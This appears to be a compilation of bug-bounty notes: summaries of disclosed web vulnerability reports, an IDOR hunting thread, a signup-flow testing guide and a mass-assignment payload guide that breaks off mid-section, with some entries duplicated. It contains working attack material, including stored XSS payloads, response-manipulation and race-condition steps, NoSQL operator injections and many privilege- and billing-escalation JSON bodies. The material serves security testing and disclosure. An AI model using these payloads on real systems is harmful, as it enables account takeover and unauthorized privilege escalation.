Number: 1
ID: #3219944
Title:IDOR - Scheduled data leak to other accounts By "projectID"

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in the GetNotebookScheduledPaginatedJobs endpoint on backend.singlestore.com. By modifying the projectID parameter in API requests, an authenticated user could access scheduled job information belonging to other users' projects. The API failed to verify whether the requestor had permission to access the specified project.
The vulnerability exposed sensitive information including database names, notebook paths, scheduling details, and infrastructure information. While exploitation required knowledge of valid project IDs, which limited the practical impact, the issue still represented an authorization bypass warranting remediation.


Number: 2
ID: #3020733
Title:IDOR - Email Verification Bypass via Race Condition

Steps to Reproduce
    Create an account using an attacker email: sijojohnson+attacker@wearehackerone.com.
    Verify the account.
    Go to account settings and update the email address to sijojohnson+attacker2@wearehackerone.com.
    Capture the request using a tool like Burp Suite.
    Send the request to Repeater twice and forward the request.
    In Repeater, modify Request 1 by changing the email to the victim's email (e.g., sijojohnson+victim@wearehackerone.com).
    In Request 2, use the attacker's email (sijojohnson+attacker2@wearehackerone.com).
    Group both requests, select Send Group in Parallel, and send the requests.
    Observe the email inbox—both the victim's and attacker's email addresses will receive the same OTP.
    Go to confirmation page displayed, Enter the OTP (both OTP's are same),
    Capture the request, and replace the email with the victim’s email.
    Send the modified request and observe the response.
    The victim’s email address is now successfully verified.

Number: 3
ID:  #3269777
Title: Replayable Password Change Request Across Sessions.

The report describes a vulnerability in the password change endpoint (PUT /authentication/password) that allows for replay attacks. An attacker who captures a valid password change request can reuse the exact same request later, even from a different session or device, to reset the password again. This vulnerability persists across session renewals and does not require fresh CSRF tokens, timestamps, or other anti-replay mechanisms.
Steps to Reproduce

Log in as a user in Browser A using valid credentials.
Intercept the password change request in Burp Suite.
Send the captured request to Burp Repeater and save it for later use.
Logout from Browser A; attempting to replay the request shows "isAuth:False".
Log in again as the same user in another Browser B.
From Burp Repeater, replay the exact same password change request captured in Step 3.
Observe that the request succeeds and the password is changed, even though it originated from a different session, after the old session was logged out, and reused the exact same body and headers.
A video recording (Recording_2025-07-24_154829.mp4) was provided as proof of concept.

Number: F4
ID: #1874836
Title: Rails Debug Mode Enabled On ( https://44.208.145.207/testrail/files.md5)

Ruby on Rails web application running in development mode has been identified on a Malwarebytes server at https://44.208.145.207/testrail/files.md5. Running Rails in development mode exposes sensitive system information that should not be accessible in a production environment. This includes information about middleware components and application root paths that could be leveraged by attackers.

Number: 5
ID: #2855610
Title: Staff with Restricted Permissions Could Access Customer Data After Company Removal
During my research on admin.shopify.com, I discovered that if a customer is associated with a specific company and places an order for that company, but is later removed from the company, staff with restricted company permissions can still access and update the customer's information.

Steps To Reproduce:

    Visit partner dashboard
    Create development store or use existing one.
    Login to admin.shopify.com.
    Invite staff member and assign them Companies > View, Restrict permissions to assigned company locations and customers permissions.
    Create a company and assign a customer to this company.
    Create an order for the company created in step 5 from the customer's account.
    Remove the customer from that company.
    Try to place a personal order with different shipping address for the customer.
    Visit the staff member account's customer tab and see the customer is still present with updated shipping address and is able to manage their personal information as well.

Number: 5
ID: #2855610
Title: Staff with Restricted Permissions Could Access Customer Data After Company Removal
During my research on admin.shopify.com, I discovered that if a customer is associated with a specific 
company and places an order for that company, but is later removed from the company, staff with restricted 
company permissions can still access and update the customer's information.

Steps To Reproduce:

    Visit partner dashboard
    Create development store or use existing one.
    Login to admin.shopify.com.
    Invite staff member and assign them Companies > View, Restrict permissions to assigned company locations and customers permissions.
    Create a company and assign a customer to this company.
    Create an order for the company created in step 5 from the customer's account.
    Remove the customer from that company.
    Try to place a personal order with different shipping address for the customer.
    Visit the staff member account's customer tab and see the customer is still present with updated shipping address 
    and is able to manage their personal information as well.

Number: 6
ID: #3185001
Title: Order More Than Maximum Allowed Quantity

A business logic vulnerability allowed users to bypass product quantity limits (1-20 items) through parameter manipulation. 
While the UI enforced these limits, server-side validation was missing.

Number: 7
ID: #3228888
Title: Account Takeover in Password Reset Function

A critical authentication bypass vulnerability was present in the password reset functionality of the ███████
website at ███████. The vulnerability allowed attackers to take over any user account without requiring 
access to the victim's phone number or the one-time password (OTP) sent via SMS. The security flaw existedin the 
implementation of the "Forgot Password" feature, where the system was designed to send an OTP to a user's registered 
phone number for verification before allowing password reset. However, the vulnerability arose from inadequate server-side 
validation that relied on client-side responses to determine the success of OTP verification. An attacker could intercept the 
server response using a proxy tool and manipulate the response parameters to bypass the OTP verification step entirely. By changing 
the response status from failure to success and modifying the JSON response body, the attacker could proceed to set a new password for
the victim's account without ever receiving or entering the legitimate OTP. This vulnerability was assigned a CVSS score of 9.6 
(Critical) and represented a complete failure of the authentication mechanism designed to protect user accounts during the password 
reset process.

Number: 8
ID: #2130385
Title: Unauthorized Blogs Creation

An unauthorized blog creation vulnerability has been identified on the lichess.org . 
By manipulating certain request and leveraging the session cookies of a different account, 
an attacker can bypass account-specific limitations and create a blog post on an account that is not yet eligible to do so.

Number: 8
ID: #2130385
Title: Unauthorized Blogs Creation

Steps to reproduce:
    1.Open a new account  and attempt to create a blog post, you will face this message below.

    2.Log in with a different browser and  an old account that has the ability to create blog posts , 
    go to create some blog with test data and solve the capatcha, but before click save fire up the burp suite, 
    catch the request and send it to repeater and then drop it

    3.Here ,I Replaced the cookies in the request with the cookeis of  the new account ,I clicked send and response be like:

    4.I coppied the location url and I visited it  in the browser while logged in with the new account.
    https://lichess.org/[The Location Header]

    5.You can see that as a new account we are able to edit the content and submit the form

    6.Verify that the unauthorized blog post is successfully created in the new account



Number: 9
ID: #3250315
Title: .8x8.vc/index.js: Exposed Google Maps API Key Allowing Potential Abuse of Paid Services

We resolved an issue where a Google Maps API key allowed potential unauthorized access to some Google Maps services.
While the API key was intentionally included in client-side code, it lacked proper restrictions to prevent abuse of paid services. 
The potential impact could theoretically lead to API quota consumption and related billing concerns, though actual impact was limited
as no evidence of exploitation was found. Our team promptly validated and addressed the report by implementing appropriate API key 
restrictions where feasible,while accepting other known limitations.

Number: 10
ID: #3221185
Title: Exceed the maximum number of subscribers using Race Condition 

A race condition vulnerability was discovered in the SingleStore control panel that allowed bypassing the maximum limit of five 
subscribers for alerts. By sending multiple concurrent POST requests to the CreateAlertReceivers endpoint with different 
email addresses, an unlimited number of subscribers could be added despite the UI displaying a restriction message.
The vulnerability was validated, triaged, and assigned a Low severity rating by the SingleStore security team.
The issue has been patched and deployed to production.

Number: 11
ID: #3219944
Title: IDOR - Scheduled data leak to other accounts By "projectID"

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in the GetNotebookScheduledPaginatedJobs
endpoint on backend.singlestore.com. By modifying the projectID parameter in API requests, an authenticated user 
could access scheduled job information belonging to other users' projects. The API failed to verify whether the
requestor had permission to access the specified project. The vulnerability exposed sensitive information including 
database names, notebook paths, scheduling details, and infrastructure information. While exploitation required knowledge 
of valid project IDs, which limited the practical impact, the issue still represented an authorization bypass warranting remediation.
This medium-severity issue has been patched by implementing proper authorization checks.


Number: 12
ID: https://x.com/the_IDORminator/status/1985517267191255431
Title: IDOR - Let's do interactive #bugbounty learning.  Path-based IDORs. Fun!

You visit a webpage with your browser, which should be Firefox, at https://www[.]place[.]com/user/12345.  

The webpage forces a client request to
https://api[.]place[.]com/api/v3/users/12345

This request responds with JSON about that user, to populate into your Firefox web browser.  Its sensitive PII.

Let me break down my thought process here.
1] The first thing I do with this in less than 5 seconds, is try the number 12344 in the path. Iterate a bit, make sure you get 401/403s back.  If not, you probably are looking at someone else's PII.  Yay, GG.

2]  I try to change the path to /v1/, /v2/, /v4/.  Remove it entirely too. Sometimes different API versions are less secure.  Those still in development, older ones, etc.

3] Then I run parameters at the end like ../api/v3/users/12345?userId=12344. 
I try every parameter from the JSON response(s). Did the response change? If it changed the parameter did something. Investigate. (Intruder here)

4] I search JS files for "/api/v3/users" or keywords in the path to find where and how the API path was built, or where there may be other API paths. This is usually in the JS.  Sometimes there are deprecated, hidden, or admin APIs laying there.   Then I try all of those. Pivot pivot pivot. 

5] I usually try appending ?, /, #, and/or URL encoded versions of each of these to the end of the API path. Sometimes that results in a bypass. One time I bypassed the security on thousands of APIs using a trailing slash due to ... well... bad code. This trick also works good when the mitigation was a WAF block.

6] Traverse backwards down the API. Check /api/v3/users/, /api/v3/, /api/, -- fuzz for obvious swagger or API schema paths. Add extra slashes, it looks cool. ///api//v3//users///// . Who knows right?

7] Throw a single quote in there, /12345'.  Did it blow up? Add another quote in there, /12345'' - did it un-blow up? Might be SQLi.  Don't try XSS, XSS is stupid.

8] Fuzz the words "users". What else could be there? 

9] Sometimes APIs reserve keywords, like "ALL".  Try things like /users/all instead of /users/12345.  Run the US Websters Dictionary through that path.  Watch case sensitivity, if it uses lower, its probably always lower.  So dont send uppercase stuff to a lowercase API. 

10] If none of this worked, I'm probably on another API at this point. Less than 10 minutes gone. 

Number: 12

ID:
Title: A Comprehensive Guide to Hunting Bugs in User Registration Features "Coffinx Writeup" 
Introduction

Hi everyone, Welcome back! Today, we’re looking into one of the most critical parts of any application: the signup flow. This is the ‘front door’ where user input first hits the database and authentication layer, which makes it a goldmine for bugs. I’m talking about everything from simple logic flaws to critical vulnerabilities.

In this article, I’m going to break down the essential checks I always do when testing registration features. These are practical, battle-tested steps straight from my pentesting methodology to help you spot the vulnerabilities that usually go unnoticed.

Table of Contents

1. Introduction  
2. Duplicate Registration and Account Overwrite  
3. Case Sensitivity and Shadow Account Bypass  
4. Denial of Service Through Large Input Fields  
5. Missing Rate Limiting During Signup  
6. Stored XSS in Registration Fields  
7. Weak or Broken Email Verification  
8. Unsafe Registration Practices (HTTP, Temp Emails)  
9. Weak Password Policies  
10. Path Overwrite and Route Collision  
11. Server-Side Validation Bypass  
12. Hidden or Legacy Registration Endpoints  
13. HTTP Parameter Pollution in Signup  
14. Weak or Predictable Verification Links  
15. Punycode and IDN Homograph Signup Bypass  
16. OTP Verification Brute-Force During Signup  
17. Weak or Reusable Session Tokens  
18. Null Byte Injection in Signup Inputs  
19. Missing Email Confirmation Enforcement  
20. Session Fixation During Signup and Verification  
21. Cache Control Issues in Signup and Verification  
22. Cross-Account IDOR Testing After Signup  
23. Mass-Assignment in JSON-Based Registration Flows 

1. Duplicate Registration / Overwriting Existing Users

This vulnerability occurs when an application fails to enforce unique constraints on user identifiers (typically the email address or username). If an attacker can register a second account using an email address that already exists in the system, it can lead to account takeovers, data corruption, or bypassing business logic restrictions.
Steps to Reproduce:

    Initial Setup: Create a legitimate first account (e.g., email: victim@gmail.com, password: Password123). Log out.
    Re-register: Create a new account using the exact same email (victim@gmail.com) but a different password (e.g., AttackerPass999).
    Verification: Try to log in using victim@gmail.com and the new password (AttackerPass999). If the application allows the process to finish successfully without throwing an “Email already exists” error, you have takeover the original account.

Variation: Case Sensitivity Bypass

Sometimes developers check for duplicates using exact string matching but store data in a case-insensitive collation database.

    Test: If abc@gmail.com exists, try registering as Abc@gmail.com or aBc@gmail.com. If the backend treats these as different during the check but the same during storage, you might trigger an overwrite or create a “shadow” duplicate account.

2. Denial of Service (DoS) at Input Fields

Signup forms accept user input that must be processed, hashed (in the case of passwords), and stored. By supplying excessively long strings, an attacker can force the server to allocate immense resources to process a single request, potentially causing the server to hang or crash (a localized DoS).
Steps to Reproduce:

    Go to the Sign-up form.
    Fill in normal data for most fields.
    In the Password field (or sometimes the Username field), enter an extremely long string of characters (e.g., 10,000+ ‘A’s). You can generate this easily in a text editor or using Python: python -c “print(‘A’*20000)”. and Submit the form.
    Observation: Monitor the response time. If the request hangs for a long time and eventually returns a 500 Internal Server Error, it indicates the server struggled to process the input, suggesting a vulnerability.

3. Lack of Rate Limiting (Mass Assignment)

If there is no limit on how many registration requests can be made from a single IP address or within a specific timeframe, an attacker can automate the creation of thousands of accounts. This can be used to flood the application’s database, send mass spam emails.
Steps to Reproduce:

    Fill out the signup form with generic details and submit it, intercepting the request in a proxy tool like Burp Suite.
    Send the captured POST request to Burp Intruder.
    In the Intruder “Positions” tab, clear existing payload markers. Add markers (§§) around the email parameter value. Example: email=testuser§1§@example.com
    In the “Payloads” tab, choose “Numbers” (e.g., from 1 to 1000) or provide a list of different email addresses and Start the attack.
    Observation: Analyze the results. If you receive a 200 OK (or whatever the success response code is for hundreds of consecutive requests without being blocked or presented with a CAPTCHA, the endpoint lacks rate limiting.

4. Cross-Site Scripting (XSS) in Registration Fields

Signup forms are common vectors for Stored XSS. An attacker injects malicious JavaScript into profile fields (Username, First Name, Last Name, and sometimes even the Email field). This script is saved to the database. The payload executes whenever another user (like an administrator viewing a user list) or the user themselves views the profile.
Common Payloads & Testing Locations:

Text Fields (Username, Name):

“><img src=x onerror=alert(1)>
<svg/onload=confirm(1)>

Email Field:

Some email validators are loose. Try injecting payloads before the @ symbol or using SVG payloads if allowed.

"><svg/onload=confirm(1)>"@x.y
"><svg/onload=prompt(1)>"@x.y

Bypasses: If basic tags are blocked, try varying capitalization (<ScRiPt>), using different event handlers (onmouseover, onsubmit), or encoding the payload.
5. Insufficient Email Verification

Email verification is crucial to ensure the user owns the email address they provided. Attackers often try to bypass this step to access functionality reserved for verified users without actually owning the email.
Bypass Methods:
A. Response Manipulation

The application may rely on a client-side JavaScript check that looks at the server’s response.

    Intercept the response from the server after submitting the signup or clicking a verification link.
    Look for parameters in the JSON response body like “is_verified”: false, “status”: “pending”, or “success”: false.
    Change the values to true/success (e.g., “is_verified”: true).
    Forward the manipulated response to the browser and see if it grants access.

B. Status Code Manipulation

Similar to response manipulation, the client-side might just be looking for a success status code.

    If accessing a protected page redirects you with a 403 Forbidden or 302 Redirect, intercept the response.
    Change the status code from 403 to 200 OK.
    Sometimes you need to remove redirect headers (like Location: /login) as well.

C. Direct/Forced Browsing

The application might only hide links to the post-registration pages rather than actually protecting them on the server side.

    Register an account but do not verify the email.
    Try to guess or force-browse directly to pages that should only be accessible after verification.

Examples:

 /user/dashboard, /account/settings, /onboarding/step2.

D. Email Verification Swap

Some applications generate a verification token based only on the user ID, not the email address. This creates a window where you can swap the email before completing verification.

    Sign up using an attacker-controlled email like attacker@mail.com
    Wait for the confirmation email but don’t open the link yet.
    If the app lets you access profile or account settings before verifying, go there.
    Try changing the account email to victim@mail.com
    The app will now send a fresh verification link to victim@mail.com Ignore it.
    Instead, go back to attacker@mail.com and open the original verification link.

If this verifies victim@mail.com using the older token, the app is vulnerable to an Email Verification Bypass via stale token reuse.
6. Weak Registration Implementation

This category covers general security best practices that are often ignored during the signup process.

    Allows Disposable Email Addresses: The application should block domains from known temporary email providers (e.g., Mailinator, TempMail). Allowing these invites abuse, spam, and ban evasion.
    Registration Form on non-HTTPS: If the signup page is served over HTTP, all data entered including the new password and personal information is transmitted in plaintext and can be intercepted by a Man-in-the-Middle attacker. you can also test by replacing https:// with http:// manually.

7. Weak Password Policy

A signup form must enforce a strong password policy to protect users from brute-force or credential-stuffing attacks later on.
Check for the following weaknesses:

    Easily Guessable Passwords: Does the form accept passwords like 123456, password, qwerty, or admin?
    Username as Password: Does the form allow the password to be identical to the username? This is a very common pattern for lazy users.
    Email as Password: Does it allow the password to be the same as the email address?
    Improper Password Recovery: While technically part of the login flow, the foundation is laid at registration. Ensure the mechanism for future password resets (e.g., security questions set during signup) is secure and not easily guessable.

8. Path Overwrite (Route Collision)

If an application hosts user profiles on the root path (e.g., site.com/{username}), an attacker can potentially “take over” critical system pages by registering a username that matches a system endpoint or filename.
Steps to Reproduce:

    Identify URL Pattern: Confirm that user profiles are accessible directly via target.tld/username.
    Register Reserved Names: Attempt to signup with usernames corresponding to critical pages or files.

    Modern Apps: login, admin, signup, api, dashboard.
    Legacy Apps: index.php, login.php, signup.php, admin.aspx.

3. Verify Overwrite: Navigate to the target URL (e.g., target.tld/login.php).

If your user profile loads instead of the actual login form or system page, you have successfully executed a Route Collision.
9. Server-Side Validation Bypass (Client-Side Only Checks)

A lot of applications rely heavily on client-side validation to enforce rules like password length, allowed characters, field formats, and required inputs. The problem is that anything enforced only in the browser can be bypassed easily with a proxy or a modified request. If the backend isn’t validating properly, attackers can push malformed or dangerous data into the system.
Steps to Reproduce:

    Open the signup page and fill in the fields with any data.
    Intercept the outgoing request using Burp Suite, OWASP ZAP, or a browser extension like Tamper.
    Modify parameters that would normally be blocked by frontend rules.

Examples:

    Empty username or email
    Password shorter than the minimum requirement
    Invalid email format (e.g., test@test, a@b, abc)
    Special characters in fields that normally block them

4. Forward the request to the server.

If the registration still succeeds despite breaking the frontend rules, the server lacks proper validation. This can lead to malformed accounts, stored XSS, broken workflows, or even injection vulnerabilities.
10. Hidden / Unlinked Registration Endpoints

Some applications expose multiple signup endpoints due to older versions, admin flows, mobile APIs or legacy functionality. These endpoints sometimes skip validations, email verification or business logic checks.
Steps to Reproduce:

    Spider or crawl the application.
    Look for endpoints like:

/api/v1/register
/auth/create
/user/create
/legacy/signup
/mobile/register

3. Compare the validation rules between each endpoint.

If any alternate endpoint allows registration without proper checks (like no email verification, no rate limiting, no password rules), it becomes an easy target for abuse.
11. Parameter Pollution in Signup Requests

HTTP Parameter Pollution (HPP) becomes dangerous when the backend doesn’t clearly define how duplicate parameters are handled. Attackers can inject extra parameters to override existing values or sneak values past validation.
Steps to Reproduce:

    Intercept the signup request.
    Add multiple values to the same parameter. Example:

email=victim@gmail.com&email=attacker@gmail.com

3. Forward the request.

If the server picks the wrong value or inconsistently processes it, you may trigger: Account takeover, Bypassed validation, Confusing or corrupted user records..
12. Weak or Predictable Verification Links

Verification links are often predictable or too short, which makes brute forcing possible.
Steps to Reproduce:

    Register a legitimate account and inspect the verification link format.
    Look for patterns like:

    Base64 email
    Short token values
    Incrementing IDs

3. Attempt token manipulation.

If tokens are guessable or not tied to the account securely, attackers can verify accounts they don’t own or hijack the verification flow.
13. Punycode and IDN Homograph Bypass

Internationalized domain names allow characters from different languages. The problem is that many Unicode characters look identical to normal English letters, even though they’re completely different under the hood. This opens the door for signup and password-reset bypasses when apps normalize emails incorrectly.
Quick example:

admin@example.com and аdmin@example.com (Cyrillic “a”) They look the same but represent two different strings. In Punycode format, it becomes something like: xn — dmin-7cd@example.com.

If the app treats both as the same after normalization, you can use the Unicode version during signup or password-reset and take over the legitimate account. For the full walkthrough with screenshots and PoC steps, you can check out the detailed article on this method.


14. OTP Verification Brute-Force During Signup

Platforms that use email or SMS OTP codes during signup often forget to implement strict rate limiting. Without throttling, attackers can brute-force the OTP and verify any unclaimed email or phone number.
Steps to Reproduce:

    Begin a signup flow that sends an OTP.
    Intercept the OTP verification request.
    Test whether you can:

    Send OTP attempts without limits
    Use rapid sequential guesses
    Change IPs and continue guessing

4. Look for HTTP headers or messages indicating lockout.

If OTPs can be brute-forced, an attacker can complete signup for any email or number without owning it. This breaks the trust model of verification entirely.
15. Weak or Reusable Session Tokens During Signup

Many systems issue an initial session token during registration and continue using it through verification, onboarding, and first login. If the token is not regenerated, attackers can preload a session and force victims into it.
Steps to Reproduce:

    Start a signup flow and capture the session cookie.
    Complete verification and onboarding.
    Compare the session token before and after verification.
    Try registering multiple accounts without refreshing your token.
    Attempt to reuse the same token across different accounts or devices.

If the session stays the same, it’s vulnerable to session fixation or hijacking. The signup process becomes a takeover vector.
15. Null Byte Injection (%00) in Signup Inputs

Some backend systems still improperly handle null bytes in strings, causing truncation or unsafe transformations. If validation happens before the null byte but storage happens after, attackers can bypass rules or corrupt user data.
Steps to Reproduce:

    Register using values like: attacker@mail.com%00victim@mail.com or username%00.jpg
    Observe how the backend stores or displays the data.
    Attempt login or verification afterward.

If the backend truncates at the null byte, you can override or break account attributes and occasionally bypass checks entirely.
16. Missing Email Confirmation Enforcement

Some applications allow users to sign up and log in without confirming ownership of their email. This flaw lets attackers register accounts with any email and impersonate other users.
Steps to Reproduce:

    Register using a random email.
    Skip the confirmation link.
    Try logging in directly.
    Attempt actions like profile update or password reset.

If the app treats the account as fully active without verifying the email, it is vulnerable.
17. Session Fixation During Signup & Verification

If the server does not rotate the session ID during signup, attackers can force victims into attacker-controlled sessions and take over their freshly created accounts.
Steps to Reproduce:

    Start a signup flow and save the session ID.
    Complete signup and verification.
    Compare the session ID before and after the process.
    Try accessing the account using the original ID.

If the ID stays the same, the platform is vulnerable to session fixation.
18. Cache Control Issues in Signup & Verification Flows

Certain pages in the signup or verification process may be cached accidentally, revealing sensitive data when using shared devices or browsers.
Steps to Reproduce:

    Complete signup or verification.
    Use the back button or offline mode.
    Inspect cached pages.
    Test private browsing and shared device scenarios.

If OTP screens, tokens, or verification status pages appear from cache, the application mishandles caching.
19. Cross-Account IDOR Test After Signup

During signup, onboarding endpoints often lack strict access control. Testing with two fresh accounts exposes IDOR issues.
Steps to Reproduce:

    Create two accounts: A and B.
    While both are in early signup or onboarding stages, capture API calls.
    Replace IDs or emails from A with B.
    Try updating or viewing each other’s onboarding steps.

If one account can modify or view another’s data, the signup flow is vulnerable to IDOR attacks.
20. Finding Mass-Assignment Bugs in JSON-Based Registration Flows

APIs that accept JSON during registration are particularly prone to mass-assignment and parameter tampering issues. Attackers can add unexpected fields or alter parameter shapes and casing to influence server-side logic (for example, granting themselves elevated roles, joining organizations, or bypassing verification). I’ve covered all the JSON-based signup manipulation techniques in the next article,

so you can dive deeper there.

    This Article Comming soon..

Conclusion

A signup flow might look simple, but it carries a lot of hidden risks. By checking for things like duplicate accounts, missing rate limits, weak passwords, and broken verification steps, you can catch the vulnerabilities that usually go unnoticed. A solid registration system sets the tone for the app’s overall security, so tightening it early makes everything more reliable.
Disclaimer


Number: 13
title:Uncovering Invisible Privileges: The Ultimate Guide to Mass-Assignment in Registration Flows
id:

Introduction
Mass-assignment weaknesses show up frequently in modern APIs, especially in signup endpoints that accept JSON. When the backend automatically maps request fields to internal models without filtering them, attackers can slip in additional parameters and gain privileges they shouldn’t have. This guide walks through the most effective JSON payload variations you can use to test registration flows and uncover silent logic flaws.

Why these bugs matter
Most frameworks deserialize JSON into objects automatically. If the server doesn’t enforce a strict allowlist of accepted fields, even a harmless-looking signup request can inject sensitive attributes like roles, admin flags, verification states or organization assignments. Understanding how different payload shapes behave is one of the most reliable ways to detect mass-assignment issues early.

Practical JSON Payload Variants for Mass-Assignment Testing
Below are categorized payload examples you can use directly during testing. Each section includes a short explanation to help you understand what the variation is meant to uncover..

Baseline payloads (different usernames and emails)
These are your initial “clean” requests. They help you confirm how the application handles uniqueness checks, email normalization, plus-addressing and subdomain-based emails. They act as a foundation before you start adding suspicious fields.

POST /api/v1/register
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"tester.jane",
  "email":"jane.tester+1@example.com",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"alpha_user",
  "email":"alpha.user@sub.example.com",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"bot_automation",
  "email":"bot+signup@example.co.uk",
  "password":"Password1!"
}
Boolean / admin flag attempts (case and type variants)
These payloads test whether the backend accepts privilege-related fields that should never be user-controlled. Changing casing, types or naming helps reveal loose parsing or inconsistent permission handling.

POST /api/v1/register
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "isAdmin": true,
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "admin": "true",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "ADMIN": 1,
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"probe_user_01",
  "email":"probe01@example.com",
  "is_admin": 1,
  "password":"Password1!"
}
Role, privilege strings, and numeric flags
Some systems map roles by name or ID. Supplying role strings or IDs can reveal whether the application exposes privilege configuration through mass-assignment. This is a common escalation vector when internal role logic is loosely enforced.

POST /api/v1/register
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role":"admin",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role":"superuser",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "role_id":0,
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"role_tester",
  "email":"role.tester@example.com",
  "user_priv":"administrator",
  "password":"Password1!"
}
Organization / tenant field variants
Multi-tenant applications often rely on IDs, slugs or organization names stored internally. If these fields are accessible during signup, an attacker might join restricted tenants or impersonate internal groups.

POST /api/v1/register
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "org":"CompanyA",
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "organization_id":1,
  "password":"Password1!"
}

POST /api/v1/register
{
  "username":"org_probe",
  "email":"org.probe@example.com",
  "org_slug":"internal-team",
  "password":"Password1!"
}
Nested objects and prototype-style payloads
JSON-backed systems often merge nested objects into existing models. This can accidentally expose internal fields. Prototype pollution attempts such as __proto__ can affect JavaScript backends that don’t sanitize keys properly.

POST /api/v1/register
{
  "username":"nested_user",
  "email":"nested.user@example.com",
  "password":"Password1!",
  "profile": {
    "bio":"testing",
    "visibility":"private"
  }
}

POST /api/v1/register
{
  "username":"proto_user",
  "email":"proto.user@example.com",
  "password":"Password1!",
  "__proto__": {"isAdmin": true}
}
Deeply nested and dot-notation keys
Some systems interpret dotted keys as nested objects. Others flatten nested objects into dot notation. These mismatches can unintentionally overwrite sensitive internal fields.

POST /api/v1/register
{
  "username":"deep_user",
  "email":"deep.user@example.com",
  "password":"Password1!",
  "account": {
    "meta": {
      "role":"admin"
    }
  }
}

POST /api/v1/register
{
  "username":"deep_user",
  "email":"deep.user@example.com",
  "password":"Password1!",
  "account.role":"admin"
}
Type confusion and mismatched data types
Different backends handle Boolean and null values differently. In some systems, “false” or 0 can still evaluate as truthy or trigger unexpected logic when coerced.

POST /api/v1/register
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": "false"
}

POST /api/v1/register
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": 0
}

POST /api/v1/register
{
  "username":"type_user",
  "email":"type.user@example.com",
  "password":"Password1!",
  "admin": null
}
Arrays and list-based tampering
Some frameworks convert arrays into strings or only use the first element. This can expose unexpected parsing behavior or override fields using array-based privilege escalation.

POST /api/v1/register
{
  "username":["array_user"],
  "email":["array.user@example.com"],
  "password":["Password1!"]
}

POST /api/v1/register
{
  "username":"array_user",
  "email":"array.user@example.com",
  "password":"Password1!",
  "roles":["user","admin"]
}
MongoDB / NoSQL operator payloads
If a server unintentionally passes JSON directly into a NoSQL query, operators like $ne or $gt can break filtering or bypass validation. This type of test must only be done in authorized environments.

POST /api/v1/register
{
  "username":"mongo_user",
  "email":"mongo.user@example.com",
  "password":"Password1!",
  "isAdmin": {"$ne": null}
}

POST /api/v1/register
{
  "username":{"$gt": ""},
  "email":"injection@example.com",
  "password":"Password1!"
}
Parameter aliases, synonyms, and name variants
Some systems accept multiple aliases for admin-related fields. Sending variations helps identify whether the backend uses loose key matching or legacy field mappings.

POST /api/v1/register
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "is_superuser": true
}

POST /api/v1/register
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "super_user": true
}

POST /api/v1/register
{
  "username":"alias_user",
  "email":"alias.user@example.com",
  "password":"Password1!",
  "staff": true
}
Verification and timestamp manipulation
Some APIs store verification flags directly from the request. Attackers may exploit these fields to mark their own email as verified or disable expiry validation.

POST /api/v1/register
{
  "username":"verify_user",
  "email":"verify.user@example.com",
  "password":"Password1!",
  "email_verified": true
}

POST /api/v1/register
{
  "username":"verify_user",
  "email":"verify.user@example.com",
  "password":"Password1!",
  "verification_expires":"1970-01-01T00:00:00Z"
}
Metadata and opaque JSON fields
Many systems allow metadata fields for logging or tracking purposes. If not properly filtered, attackers can overwrite internal metadata or inject privilege hints.

POST /api/v1/register
{
  "username":"meta_user",
  "email":"meta.user@example.com",
  "password":"Password1!",
  "metadata": {
    "internal_role":"admin",
    "created_by":"script"
  }
}
Encoding and content-type tricks
Some APIs trust the Content-Type header too much. If the backend has fallback parsers, sending the same JSON with a different or misleading content type can trigger unexpected parsing logic. That can open the door to weaker validation or alternate code paths the developers didn’t intend to expose.

POST /api/v1/register
Content-Type: text/plain

{
  "username": "ct_user",
  "email": "ct.user@example.com",
  "password": "Password1!",
  "isAdmin": true
}
Even though the header says text/plain, some frameworks still try to parse it as JSON. If the validation for “non-JSON” requests is weaker, attackers can slip in fields like isAdmin without being filtered. And even send no Content-Type header at all to see what the server does.

You can also try:
Content-Type: application/x-www-form-urlencoded
Content-Type: application/xml
Content-Type: */*
Content-Type: application/json; charset=garbage
Content-Type: application/json; boundary=--
Content-Type: application/json; x=1
String-encoded JSON fields
Some APIs try to parse strings that look like JSON. This is a common oversight when fields are stored in schemaless or flexible models.

POST /api/v1/register
{
  "username":"string_json",
  "email":"string.json@example.com",
  "password":"Password1!",
  "profile":"{\"isAdmin\":true}"
}
Large / repeated fields
Oversized payloads help identify length limits, truncation or failure modes in the signup flow. They’re also useful for discovering unexpected storage behavior.

POST /api/v1/register
{
  "username":"long_user",
  "email":"long.user@example.com",
  "password":"Password1!",
  "bio":"AAAAAA... (very long string)"
}
Subscription & Billing Bypass
This is often overlooked. In SaaS applications, user models frequently store subscription data. If you can manipulate these fields during signup, you might trick the system into giving you a “Pro” or “Enterprise” account without paying anything.

POST /api/v1/register
{
  "username": "freeloader",
  "email": "free@example.com",
  "plan": "pro",
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "freeloader",
  "email": "free@example.com",
  "subscription_id": 9999,
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "freeloader",
  "email": "free@example.com",
  "is_premium": true,
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "freeloader",
  "email": "free@example.com",
  "trial_ends_at": "2050-01-01T00:00:00Z",
  "password": "Password1!"
}
Workflow State Jumping
